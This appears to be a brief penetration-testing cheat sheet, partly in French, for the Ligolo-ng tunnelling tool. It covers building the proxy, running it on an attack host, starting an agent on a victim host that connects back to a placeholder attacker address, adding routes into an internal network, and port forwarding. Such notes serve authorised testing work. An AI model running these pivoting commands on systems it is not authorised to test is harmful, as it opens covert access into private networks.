
https://github.com/nicocha30/ligolo-ng
https://docs.ligolo.ng/

```bash
# Compiler
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng
go build -o proxy cmd/proxy/main.go

# Version Pré-Compilée
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
```

**Attack host**
```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:443
interface_delete --name "pivot"
interface_create --name "pivot"
```

**Victim host**
```bash
./agent -connect <ATTACK_HOST>:443 -ignore-cert
```

**Attack host**
```bash
session
tunnel_start --tun pivot 
ifconfig
route_add --name pivot --route <INTERNAL_NETWORK>/<CIDR>

# Bash
ip route show
# Vérifier que la route et présenté et n'est pas en linkdown, sinon :
tunnel_start --tun pivot
```

**Port forwarding**

The following example will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.

```
[Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp 
INFO[1208] Listener created on remote agent!`

[Agent : nchatelain@nworkstation] » listener_list 
```